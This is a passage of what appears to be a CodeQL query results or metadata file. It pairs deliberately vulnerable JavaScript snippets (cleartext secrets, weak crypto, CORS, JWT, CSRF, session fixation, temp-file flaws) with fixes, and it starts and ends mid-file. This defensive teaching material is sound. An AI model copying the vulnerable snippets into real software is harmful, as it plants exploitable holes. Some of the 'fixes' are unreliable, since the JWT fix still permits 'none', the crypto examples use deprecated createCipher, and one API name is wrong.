    Sensitive information included in a build artifact can allow an attacker to access the sensitive information if the artifact is published.


    ## Recommendation
    Only store information that is meant to be publicly available in a build artifact.


    ## Example
    The following example creates a `webpack` configuration that inserts all environment variables from the host into the build artifact:


    ```javascript
    const webpack = require("webpack");

    module.exports = [{
        plugins: [
            new webpack.DefinePlugin({
                "process.env": JSON.stringify(process.env)
            })
        ]
    }];
    ```
    The environment variables might include API keys or other sensitive information, and the build-system should instead insert only the environment variables that are supposed to be public.

    The issue has been fixed below, where only the `DEBUG` environment variable is inserted into the artifact.


    ```javascript
    const webpack = require("webpack");

    module.exports = [{
        plugins: [
            new webpack.DefinePlugin({
                'process.env': JSON.stringify({ DEBUG: process.env.DEBUG })
            })
        ]
    }];

    ```

    ## References
    * webpack: [DefinePlugin API](https://webpack.js.org/plugins/define-plugin/).
    * Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).
    * Common Weakness Enumeration: [CWE-315](https://cwe.mitre.org/data/definitions/315.html).
    * Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-312/CleartextLogging.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-312/CleartextLogging.bqrs
  metadata:
    name: Clear-text logging of sensitive information
    description: |-
      Logging sensitive information without encryption or hashing can
                    expose it to an attacker.
    kind: path-problem
    problem.severity: error
    security-severity: 7.5
    precision: high
    id: js/clear-text-logging
    tags: |-
      security
             external/cwe/cwe-312
             external/cwe/cwe-359
             external/cwe/cwe-532
  queryHelp: "# Clear-text logging of sensitive information\nIf sensitive data is\
    \ written to a log entry it could be exposed to an attacker who gains access to\
    \ the logs.\n\nPotential attackers can obtain sensitive user data when the log\
    \ output is displayed. Additionally that data may expose system information such\
    \ as full path names, system information, and sometimes usernames and passwords.\n\
    \n\n## Recommendation\nSensitive data should not be logged.\n\n\n## Example\n\
    In the example the entire process environment is logged using \\`console.info\\\
    `. Regular users of the production deployed application should not have access\
    \ to this much information about the environment configuration.\n\n\n```javascript\n\
    // BAD: Logging cleartext sensitive data\nconsole.info(`[INFO] Environment: ${JSON.stringify(process.env)}`);\n\
    \n```\nIn the second example the data that is logged is not sensitive.\n\n\n```javascript\n\
    let not_sensitive_data = { a: 1, b : 2} \n// GOOD: it is fine to log data that\
    \ is not sensitive\nconsole.info(`[INFO] Some object contains: ${JSON.stringify(not_sensitive_data)}`);\n\
    ```\n\n## References\n* OWASP: [Insertion of Sensitive Information into Log File](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/).\n\
    * Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n\
    * Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n\
    * Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-312/CleartextStorage.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-312/CleartextStorage.bqrs
  metadata:
    name: Clear text storage of sensitive information
    description: |-
      Sensitive information stored without encryption or hashing can expose it to an
                    attacker.
    kind: path-problem
    problem.severity: error
    security-severity: 7.5
    precision: high
    id: js/clear-text-storage-of-sensitive-data
    tags: |-
      security
             external/cwe/cwe-312
             external/cwe/cwe-315
             external/cwe/cwe-359
  queryHelp: |
    # Clear text storage of sensitive information
    Sensitive information that is stored unencrypted is accessible to an attacker who gains access to the storage. This is particularly important for cookies, which are stored on the machine of the end-user.


    ## Recommendation
    Ensure that sensitive information is always encrypted before being stored. If possible, avoid placing sensitive information in cookies altogether. Instead, prefer storing, in the cookie, a key that can be used to look up the sensitive information.

    In general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.

    Be aware that external processes often store the `standard out` and `standard error` streams of the application, causing logged sensitive information to be stored as well.


    ## Example
    The following example code stores user credentials (in this case, their password) in a cookie in plain text:


    ```javascript
    var express = require('express');

    var app = express();
    app.get('/remember-password', function (req, res) {
      let pw = req.param("current_password");
      // BAD: Setting a cookie value with cleartext sensitive data.
      res.cookie("password", pw);
    });

    ```
    Instead, the credentials should be encrypted, for instance by using the Node.js `crypto` module:


    ```javascript
    var express = require('express');
    var crypto = require('crypto'),
        password = getPassword();

    function encrypt(text){
      var cipher = crypto.createCipher('aes-256-ctr', password);
      return cipher.update(text, 'utf8', 'hex') + cipher.final('hex');
    }

    var app = express();
    app.get('/remember-password', function (req, res) {
      let pw = req.param("current_password");
      // GOOD: Encoding the value before setting it.
      res.cookie("password", encrypt(pw));
    });

    ```

    ## References
    * M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.
    * M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.
    * Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).
    * Common Weakness Enumeration: [CWE-315](https://cwe.mitre.org/data/definitions/315.html).
    * Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-326/InsufficientKeySize.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-326/InsufficientKeySize.bqrs
  metadata:
    name: Use of a weak cryptographic key
    description: Using a weak cryptographic key can allow an attacker to compromise
      security.
    kind: problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/insufficient-key-size
    tags: |-
      security
             external/cwe/cwe-326
  queryHelp: |
    # Use of a weak cryptographic key
    Modern encryption relies on it being computationally infeasible to break the cipher and decode a message without the key. As computational power increases, the ability to break ciphers grows and keys need to become larger.


    ## Recommendation
    An encryption key should be at least 2048-bit long when using RSA encryption, and 128-bit long when using symmetric encryption.


    ## References
    * Wikipedia: [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)).
    * Wikipedia: [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard).
    * NodeJS: [Crypto](https://nodejs.org/api/crypto.html).
    * NIST: [ Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf).
    * Wikipedia: [Key size](https://en.wikipedia.org/wiki/Key_size)
    * Common Weakness Enumeration: [CWE-326](https://cwe.mitre.org/data/definitions/326.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-327/BadRandomness.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-327/BadRandomness.bqrs
  metadata:
    name: Creating biased random numbers from a cryptographically secure source
    description: |-
      Some mathematical operations on random numbers can cause bias in
                    the results and compromise security.
    kind: problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/biased-cryptographic-random
    tags: |-
      security
             external/cwe/cwe-327
  queryHelp: |
    # Creating biased random numbers from a cryptographically secure source
    Generating secure random numbers can be an important part of creating a secure software system. This can be done using APIs that create cryptographically secure random numbers.

    However, using some mathematical operations on these cryptographically secure random numbers can create biased results, where some outcomes are more likely than others. Such biased results can make it easier for an attacker to guess the random numbers, and thereby break the security of the software system.


    ## Recommendation
    Be very careful not to introduce bias when performing mathematical operations on cryptographically secure random numbers.

    If possible, avoid performing mathematical operations on cryptographically secure random numbers at all, and use a preexisting library instead.


    ## Example
    The example below uses the modulo operator to create an array of 10 random digits using random bytes as the source for randomness.


    ```javascript
    const crypto = require('crypto');

    const digits = [];
    for (let i = 0; i < 10; i++) {
        digits.push(crypto.randomBytes(1)[0] % 10); // NOT OK
    }
    ```
    The random byte is a uniformly random value between 0 and 255, and thus the result from using the modulo operator is slightly more likely to be between 0 and 5 than between 6 and 9.

    The issue has been fixed in the code below by using a library that correctly generates cryptographically secure random values.


    ```javascript
    const cryptoRandomString = require('crypto-random-string');

    const digits = cryptoRandomString({length: 10, type: 'numeric'});
    ```
    Alternatively, the issue can be fixed by fixing the math in the original code. In the code below the random byte is discarded if the value is greater than or equal to 250. Thus the modulo operator is used on a uniformly random number between 0 and 249, which results in a uniformly random digit between 0 and 9.


    ```javascript
    const crypto = require('crypto');

    const digits = [];
    while (digits.length < 10) {
        const byte = crypto.randomBytes(1)[0];
        if (byte >= 250) {
            continue;
        }
        digits.push(byte % 10); // OK
    }
    ```

    ## References
    * Stack Overflow: [Understanding randomness](https://stackoverflow.com/questions/3956478/understanding-randomness).
    * OWASP: [Insecure Randomness](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness).
    * OWASP: [Rule - Use strong approved cryptographic algorithms](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#rule---use-strong-approved-authenticated-encryption).
    * Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-327/BrokenCryptoAlgorithm.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-327/BrokenCryptoAlgorithm.bqrs
  metadata:
    name: Use of a broken or weak cryptographic algorithm
    description: Using broken or weak cryptographic algorithms can compromise security.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/weak-cryptographic-algorithm
    tags: |-
      security
             external/cwe/cwe-327
             external/cwe/cwe-328
  queryHelp: |
    # Use of a broken or weak cryptographic algorithm
    Using broken or weak cryptographic algorithms can leave data vulnerable to being decrypted or forged by an attacker.

    Many cryptographic algorithms provided by cryptography libraries are known to be weak, or flawed. Using such an algorithm means that encrypted or hashed data is less secure than it appears to be.


    ## Recommendation
    Ensure that you use a strong, modern cryptographic algorithm. Use at least AES-128 or RSA-2048 for encryption, and SHA-2 or SHA-3 for secure hashing.


    ## Example
    The following code shows an example of using the builtin cryptographic library of NodeJS to encrypt some secret data. When creating a `Cipher` instance to encrypt the secret data with, you must specify the encryption algorithm to use. The first example uses DES, which is an older algorithm that is now considered weak. The second example uses AES, which is a strong modern algorithm.


    ```javascript
    const crypto = require('crypto');

    var secretText = obj.getSecretText();

    const desCipher = crypto.createCipher('des', key);
    let desEncrypted = desCipher.write(secretText, 'utf8', 'hex'); // BAD: weak encryption

    const aesCipher = crypto.createCipher('aes-128', key);
    let aesEncrypted = aesCipher.update(secretText, 'utf8', 'hex'); // GOOD: strong encryption

    ```

    ## References
    * NIST, FIPS 140 Annex a: [ Approved Security Functions](http://csrc.nist.gov/publications/fips/fips140-2/fips1402annexa.pdf).
    * NIST, SP 800-131A: [ Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths](http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf).
    * OWASP: [Rule - Use strong approved cryptographic algorithms](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#rule---use-strong-approved-authenticated-encryption).
    * Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).
    * Common Weakness Enumeration: [CWE-328](https://cwe.mitre.org/data/definitions/328.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-338/InsecureRandomness.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-338/InsecureRandomness.bqrs
  metadata:
    name: Insecure randomness
    description: |-
      Using a cryptographically weak pseudo-random number generator to generate a
                    security-sensitive value may allow an attacker to predict what value will
                    be generated.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.8
    precision: high
    id: js/insecure-randomness
    tags: |-
      security
             external/cwe/cwe-338
  queryHelp: "# Insecure randomness\nUsing a cryptographically weak pseudo-random\
    \ number generator to generate a security-sensitive value, such as a password,\
    \ makes it easier for an attacker to predict the value.\n\nPseudo-random number\
    \ generators generate a sequence of numbers that only approximates the properties\
    \ of random numbers. The sequence is not truly random because it is completely\
    \ determined by a relatively small set of initial values, the seed. If the random\
    \ number generator is cryptographically weak, then this sequence may be easily\
    \ predictable through outside observations.\n\n\n## Recommendation\nUse a cryptographically\
    \ secure pseudo-random number generator if the output is to be used in a security-sensitive\
    \ context. As a rule of thumb, a value should be considered \"security-sensitive\"\
    \ if predicting it would allow the attacker to perform an action that they would\
    \ otherwise be unable to perform. For example, if an attacker could predict the\
    \ random password generated for a new user, they would be able to log in as that\
    \ new user.\n\nFor JavaScript on the NodeJS platform, `crypto.getRandomBytes`\
    \ provides a cryptographically secure pseudo-random byte generator. Note that\
    \ the conversion from bytes to numbers can introduce bias that breaks the security.\n\
    \nFor JavaScript in the browser, `crypto.getRandomValues` provides a cryptographically\
    \ secure pseudo-random number generator.\n\n\n## Example\nThe following examples\
    \ show different ways of generating a password.\n\nIn the first case, we generate\
    \ a fresh password by appending a random integer to the end of a static string.\
    \ The random number generator used (`Math.random`) is not cryptographically secure,\
    \ so it may be possible for an attacker to predict the generated password.\n\n\
    \n```javascript\nfunction insecurePassword() {\n    // BAD: the random suffix\
    \ is not cryptographically secure\n    var suffix = Math.random();\n    var password\
    \ = \"myPassword\" + suffix;\n    return password;\n}\n\n```\nIn the second example,\
    \ a cryptographically secure random number generator is used for the same purpose.\
    \ In this case, it is much harder to predict the generated integers.\n\n\n```javascript\n\
    function securePassword() {\n    // GOOD: the random suffix is cryptographically\
    \ secure\n    var suffix = window.crypto.getRandomValues(new Uint32Array(1))[0];\n\
    \    var password = \"myPassword\" + suffix;\n    \n    // GOOD: if a random value\
    \ between 0 and 1 is desired\n    var secret = window.crypto.getRandomValues(new\
    \ Uint32Array(1))[0] * Math.pow(2,-32);\n}\n\n```\n\n## References\n* Wikipedia:\
    \ [Pseudo-random number generator](http://en.wikipedia.org/wiki/Pseudorandom_number_generator).\n\
    * Mozilla Developer Network: [Crypto: getRandomValues()](https://developer.mozilla.org/en-US/docs/Web/API/Crypto/getRandomValues).\n\
    * NodeJS: [crypto.randomBytes](https://nodejs.org/api/crypto.html#crypto_crypto_randombytes_size_callback)\n\
    * Common Weakness Enumeration: [CWE-338](https://cwe.mitre.org/data/definitions/338.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-346/CorsMisconfigurationForCredentials.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-346/CorsMisconfigurationForCredentials.bqrs
  metadata:
    name: CORS misconfiguration for credentials transfer
    description: Misconfiguration of CORS HTTP headers allows for leaks of secret
      credentials.
    kind: path-problem
    problem.severity: error
    security-severity: 7.5
    precision: high
    id: js/cors-misconfiguration-for-credentials
    tags: |-
      security
             external/cwe/cwe-346
             external/cwe/cwe-639
             external/cwe/cwe-942
  queryHelp: |
    # CORS misconfiguration for credentials transfer
    A server can send the `"Access-Control-Allow-Credentials"` CORS header to control when a browser may send user credentials in Cross-Origin HTTP requests.

    When the `Access-Control-Allow-Credentials` header is `"true"`, the `Access-Control-Allow-Origin` header must have a value different from `"*"` in order to make browsers accept the header. Therefore, to allow multiple origins for Cross-Origin requests with credentials, the server must dynamically compute the value of the `"Access-Control-Allow-Origin"` header. Computing this header value from information in the request to the server can therefore potentially allow an attacker to control the origins that the browser sends credentials to.


    ## Recommendation
    When the `Access-Control-Allow-Credentials` header value is `"true"`, a dynamic computation of the `Access-Control-Allow-Origin` header must involve sanitization if it relies on user-controlled input.

    Since the `"null"` origin is easy to obtain for an attacker, it is never safe to use `"null"` as the value of the `Access-Control-Allow-Origin` header when the `Access-Control-Allow-Credentials` header value is `"true"`.


    ## Example
    In the example below, the server allows the browser to send user credentials in a Cross-Origin request. The request header `origins` controls the allowed origins for such a Cross-Origin request.


    ```javascript
    var https = require('https'),
        url = require('url');

    var server = https.createServer(function(){});

    server.on('request', function(req, res) {
        let origin = url.parse(req.url, true).query.origin;
         // BAD: attacker can choose the value of origin
        res.setHeader("Access-Control-Allow-Origin", origin);
        res.setHeader("Access-Control-Allow-Credentials", true);

        // ...
    });

    ```
    This is not secure, since an attacker can choose the value of the `origin` request header to make the browser send credentials to their own server. The use of a whitelist containing allowed origins for the Cross-Origin request fixes the issue:


    ```javascript
    var https = require('https'),
        url = require('url');

    var server = https.createServer(function(){});

    server.on('request', function(req, res) {
        let origin = url.parse(req.url, true).query.origin,
            whitelist = {
                "https://example.com": true,
                "https://subdomain.example.com": true,
                "https://example.com:1337": true
            };

        if (origin in whitelist) {
            // GOOD: the origin is in the whitelist
            res.setHeader("Access-Control-Allow-Origin", origin);
            res.setHeader("Access-Control-Allow-Credentials", true);
        }

        // ...
    });

    ```

    ## References
    * Mozilla Developer Network: [CORS, Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin).
    * Mozilla Developer Network: [CORS, Access-Control-Allow-Credentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials).
    * PortSwigger: [Exploiting CORS Misconfigurations for Bitcoins and Bounties](http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html)
    * W3C: [CORS for developers, Advice for Resource Owners](https://w3c.github.io/webappsec-cors-for-developers/#resources)
    * Common Weakness Enumeration: [CWE-346](https://cwe.mitre.org/data/definitions/346.html).
    * Common Weakness Enumeration: [CWE-639](https://cwe.mitre.org/data/definitions/639.html).
    * Common Weakness Enumeration: [CWE-942](https://cwe.mitre.org/data/definitions/942.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-347/MissingJWTKeyVerification.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-347/MissingJWTKeyVerification.bqrs
  metadata:
    name: JWT missing secret or public key verification
    description: The application does not verify the JWT payload with a cryptographic
      secret or public key.
    kind: problem
    problem.severity: warning
    security-severity: 7.0
    precision: high
    id: js/jwt-missing-verification
    tags: |-
      security
             external/cwe/cwe-347
  queryHelp: "# JWT missing secret or public key verification\nApplications decoding\
    \ JSON Web Tokens (JWT) may be misconfigured due to the `None` algorithm.\n\n\
    The `None` algorithm is selected by calling the `verify()` function with a falsy\
    \ value instead of a cryptographic secret or key. The `None` algorithm disables\
    \ the integrity enforcement of a JWT payload and may allow a malicious actor to\
    \ make unintended changes to a JWT payload leading to critical security issues\
    \ like privilege escalation.\n\n\n## Recommendation\nCalls to `verify()` functions\
    \ should use a cryptographic secret or key to decode JWT payloads.\n\n\n## Example\n\
    In the example below, `false` is used to disable the integrity enforcement of\
    \ a JWT payload. This may allow a malicious actor to make changes to a JWT payload.\n\
    \n\n```javascript\nconst jwt = require(\"jsonwebtoken\");\n\nconst secret = \"\
    my-secret-key\";\n\nvar token = jwt.sign({ foo: 'bar' }, secret, { algorithm:\
    \ \"none\" })\njwt.verify(token, false, { algorithms: [\"HS256\", \"none\"] })\n\
    ```\nThe following code fixes the problem by using a cryptographic secret or key\
    \ to decode JWT payloads.\n\n\n```javascript\n\nconst jwt = require(\"jsonwebtoken\"\
    );\n\nconst secret = \"my-secret-key\";\n\nvar token = jwt.sign({ foo: 'bar' },\
    \ secret, { algorithm: \"HS256\" }) \njwt.verify(token, secret, { algorithms:\
    \ [\"HS256\", \"none\"] })\n```\n\n## References\n* Auth0 Blog: [Meet the \"None\"\
    \ Algorithm](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/#Meet-the--None--Algorithm).\n\
    * Common Weakness Enumeration: [CWE-347](https://cwe.mitre.org/data/definitions/347.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-352/MissingCsrfMiddleware.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-352/MissingCsrfMiddleware.bqrs
  metadata:
    name: Missing CSRF middleware
    description: |-
      Using cookies without CSRF protection may allow malicious websites to
                    submit requests on behalf of the user.
    kind: problem
    problem.severity: error
    security-severity: 8.8
    precision: high
    id: js/missing-token-validation
    tags: |-
      security
             external/cwe/cwe-352
  queryHelp: |
    # Missing CSRF middleware
    Websites that rely on cookie-based authentication may be vulnerable to cross-site request forgery (CSRF). Specifically, a state-changing request should include a secret token so the request can't be forged by an attacker. Otherwise, unwanted requests can be submitted on behalf of a user who visits a malicious website.

    This is typically mitigated by embedding a session-specific secret token in each request. This token is then checked as an additional authentication measure. A malicious website should have no way of guessing the correct token to embed in the request.


    ## Recommendation
    Use a middleware package such as `lusca.csrf` to protect against CSRF attacks.


    ## Example
    In the example below, the server authenticates users before performing the `changeEmail` POST action:


    ```javascript
    const app = require("express")(),
      cookieParser = require("cookie-parser"),
      bodyParser = require("body-parser"),
      session = require("express-session");

    app.use(cookieParser());
    app.use(bodyParser.urlencoded({ extended: false }));
    app.use(session({ secret: process.env['SECRET'], cookie: { maxAge: 60000 } }));

    // ...

    app.post("/changeEmail", function(req, res) {
      const userId = req.session.id;
      const email = req.body["email"];
      // ... update email associated with userId
    });

    ```
    This is not secure. An attacker can submit a POST `changeEmail` request on behalf of a user who visited a malicious website. Since authentication happens without any action from the user, the `changeEmail` action would be executed, despite not being initiated by the user.

    This vulnerability can be mitigated by installing a CSRF protecting middleware handler:


    ```javascript
    const app = require("express")(),
      cookieParser = require("cookie-parser"),
      bodyParser = require("body-parser"),
      session = require("express-session"),
      csrf = require('lusca').csrf;

    app.use(cookieParser());
    app.use(bodyParser.urlencoded({ extended: false }));
    app.use(session({ secret: process.env['SECRET'], cookie: { maxAge: 60000 } }));
    app.use(csrf());

    // ...

    app.post("/changeEmail", function(req, res) {
      const userId = req.session.id;
      const email = req.body["email"];
      // ... update email associated with userId
    });

    ```

    ## References
    * OWASP: [Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
    * NPM: [lusca](https://www.npmjs.com/package/lusca)
    * Common Weakness Enumeration: [CWE-352](https://cwe.mitre.org/data/definitions/352.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-367/FileSystemRace.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-367/FileSystemRace.bqrs
  metadata:
    name: Potential file system race condition
    description: |-
      Separately checking the state of a file before operating
                    on it may allow an attacker to modify the file between
                    the two operations.
    kind: problem
    problem.severity: warning
    security-severity: 7.7
    precision: medium
    id: js/file-system-race
    tags: |-
      security
             external/cwe/cwe-367
  queryHelp: |
    # Potential file system race condition
    Often it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.

    However, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.


    ## Recommendation
    Use file descriptors instead of file names whenever possible.


    ## Example
    The following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.


    ```javascript
    const fs = require("fs");
    const os = require("os");
    const path = require("path");

    const filePath = path.join(os.tmpdir(), "my-temp-file.txt");

    if (!fs.existsSync(filePath)) {
      fs.writeFileSync(filePath, "Hello", { mode: 0o600 });
    }

    ```
    However, in a multi-user environment the file might be created by another user between the existence check and the write.

    This can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.


    ```javascript
    const fs = require("fs");
    const os = require("os");
    const path = require("path");

    const filePath = path.join(os.tmpdir(), "my-temp-file.txt");

    try {
      const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);

      fs.writeFileSync(fd, "Hello");
    } catch (e) {
      // file existed
    }

    ```

    ## References
    * Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).
    * The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).
    * NodeJS: [The FS module](https://nodejs.org/api/fs.html).
    * Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-377/InsecureTemporaryFile.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-377/InsecureTemporaryFile.bqrs
  metadata:
    name: Insecure temporary file
    description: |-
      Creating a temporary file that is accessible by other users can
       lead to information disclosure and sometimes remote code execution.
    kind: path-problem
    id: js/insecure-temporary-file
    problem.severity: warning
    security-severity: 7.0
    precision: medium
    tags: |-
      external/cwe/cwe-377
             external/cwe/cwe-378
             security
  queryHelp: |
    # Insecure temporary file
    Temporary files created in the operating system's temporary directory are by default accessible to other users. In some cases, this can lead to information exposure, or in the worst case, to remote code execution.


    ## Recommendation
    Use a well-tested library like [tmp](https://www.npmjs.com/package/tmp) for creating temporary files. These libraries ensure both that the file is inaccessible to other users and that the file does not already exist.


    ## Example
    The following example creates a temporary file in the operating system's temporary directory.


    ```javascript
    const fs = require('fs');
    const os = require('os');
    const path = require('path');

    const file = path.join(os.tmpdir(), "test-" + (new Date()).getTime() + ".txt");
    fs.writeFileSync(file, "content");
    ```
    The file created above is accessible to other users, and there is no guarantee that the file does not already exist.

    The below example uses the [tmp](https://www.npmjs.com/package/tmp) library to securely create a temporary file.


    ```javascript
    const fs = require('fs');
    const tmp = require('tmp');

    const file = tmp.fileSync().name;
    fs.writeFileSync(file, "content");
    ```

    ## References
    * Mitre.org: [CWE-377](https://cwe.mitre.org/data/definitions/377.html).
    * NPM: [tmp](https://www.npmjs.com/package/tmp).
    * Common Weakness Enumeration: [CWE-377](https://cwe.mitre.org/data/definitions/377.html).
    * Common Weakness Enumeration: [CWE-378](https://cwe.mitre.org/data/definitions/378.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-384/SessionFixation.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-384/SessionFixation.bqrs
  metadata:
    name: Failure to abandon session
    description: |-
      Reusing an existing session as a different user could allow
                    an attacker to access someone else's account by using
                    their session.
    kind: problem
    problem.severity: warning
    security-severity: 5
    precision: medium
    id: js/session-fixation
    tags: |-
      security
             external/cwe/cwe-384
  queryHelp: |
    # Failure to abandon session
    Reusing a session could allow an attacker to gain unauthorized access to another account. Always ensure that, when a user logs in or out, the current session is abandoned so that a new session may be started.


    ## Recommendation
    Always use `req.session.regenerate(...);` to start a new session when a user logs in or out.


    ## Example
    The following example shows the previous session being used after authentication. This would allow a previous user to use the new user's account.


    ```javascript
    const express = require('express');
    const session = require('express-session');
    var bodyParser = require('body-parser')
    const app = express();
    app.use(bodyParser.urlencoded({ extended: false }))
    app.use(session({
        secret: 'keyboard cat'
    }));

    app.post('/login', function (req, res) {
        // Check that username password matches
        if (req.body.username === 'admin' && req.body.password === 'admin') {
            req.session.authenticated = true;
            res.redirect('/');
        } else {
            res.redirect('/login');
        }
    });
    ```
    This code example solves the problem by not reusing the session, and instead calling `req.session.regenerate()` to ensure that the session is not reused.


    ```javascript
    const express = require('express');
    const session = require('express-session');
    var bodyParser = require('body-parser')
    const app = express();
    app.use(bodyParser.urlencoded({ extended: false }))
    app.use(session({
        secret: 'keyboard cat'
    }));

    app.post('/login', function (req, res) {
        // Check that username password matches
        if (req.body.username === 'admin' && req.body.password === 'admin') {
            req.session.regenerate(function (err) {
                if (err) {
                    res.send('Error');
                } else {
                    req.session.authenticated = true;
                    res.redirect('/');
                }
            });
        } else {
            res.redirect('/login');
        }
    });
    ```

    ## References
    * OWASP: [Session fixation](https://www.owasp.org/index.php/Session_fixation)
    * Stack Overflow: [Creating a new session after authentication with Passport](https://stackoverflow.com/questions/22209354/creating-a-new-session-after-authentication-with-passport/30468384#30468384)
    * jscrambler.com: [Best practices for secure session management in Node](https://blog.jscrambler.com/best-practices-for-secure-session-management-in-node)
    * Common Weakness Enumeration: [CWE-384](https://cwe.mitre.org/data/definitions/384.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-400/DeepObjectResourceExhaustion.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-400/DeepObjectResourceExhaustion.bqrs
  metadata:
    name: Resources exhaustion from deep object traversal
    description: Processing user-controlled object hierarchies inefficiently can lead
      to denial of service.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.5
    precision: high
    id: js/resource-exhaustion-from-deep-object-traversal
    tags: |-
      security
             external/cwe/cwe-400
  queryHelp: "# Resources exhaustion from deep object traversal\nProcessing user-controlled\
    \ data with a method that allocates excessive amounts of memory can lead to denial\
    \ of service.\n\nIf the JSON schema validation library `ajv` is configured with\
    \ `allErrors: true` there is no limit to how many error objects will be allocated.\
    \ An attacker can exploit this by sending an object that deliberately contains\
    \ a huge number of errors, and in some cases, with longer and longer error messages.\
    \ This can cause the service to become unresponsive due to the slow error-checking\
    \ process.\n\n\n## Recommendation\nDo not use `allErrors: true` in production.\n\
    \n\n## Example\nIn the example below, the user-submitted object `req.body` is\
    \ validated using `ajv` and `allErrors: true`:\n\n\n```javascript\nimport express\
    \ from 'express';\nimport Ajv from 'ajv';\n\nlet ajv = new Ajv({ allErrors: true\
    \ });\najv.addSchema(require('./input-schema'), 'input');\n\nvar app = express();\n\
    app.get('/user/:id', function(req, res) {\n\tif (!ajv.validate('input', req.body))\
    \ {\n\t\tres.end(ajv.errorsText());\n\t\treturn;\n\t}\n\t// ...\n});\n\n```\n\
    Although this ensures that `req.body` conforms to the schema, the validation itself\
    \ could be vulnerable to a denial-of-service attack. An attacker could send an\
    \ object containing so many errors that the server runs out of memory.\n\nA solution\
    \ is to not pass in `allErrors: true`, which means `ajv` will only report the\
    \ first error, not all of them:\n\n\n```javascript\nimport express from 'express';\n\
    import Ajv from 'ajv';\n\nlet ajv = new Ajv({ allErrors: process.env['REST_DEBUG']\
    \ });\najv.addSchema(require('./input-schema'), 'input');\n\nvar app = express();\n\
    app.get('/user/:id', function(req, res) {\n\tif (!ajv.validate('input', req.body))\
